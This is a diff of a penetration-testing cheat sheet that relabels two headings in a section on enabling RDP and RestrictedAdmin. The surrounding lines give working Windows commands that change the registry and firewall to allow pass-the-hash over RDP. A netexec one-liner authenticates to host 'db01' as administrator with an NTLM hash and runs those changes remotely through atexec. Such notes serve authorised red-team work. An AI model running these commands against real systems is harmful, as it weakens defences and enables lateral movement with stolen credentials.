@@ -96,13 +96,13 @@ Sticky Notes Path:
 # Enable RDP and RestrictedAdmin
 *Note: Enabling RestrictedAdmin allow us to perform PassTheHash with RDP.*
 
-Using command prompt: 
+Using command prompt (Local): 
 
 ```
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f && reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0 && netsh firewall set service remoteadmin enable && netsh firewall set service remotedesktop enable
 ``` 
 
-Using netexec:
+Using netexec (Remote):
 ```
 netexec smb db01 -u administrator -H faf3185b0a608ce2f8afb6f8d133f85b --local-auth -X 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f;reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0;netsh firewall set service remoteadmin enable;netsh firewall set service remotedesktop enable' --exec-method atexec
 ```
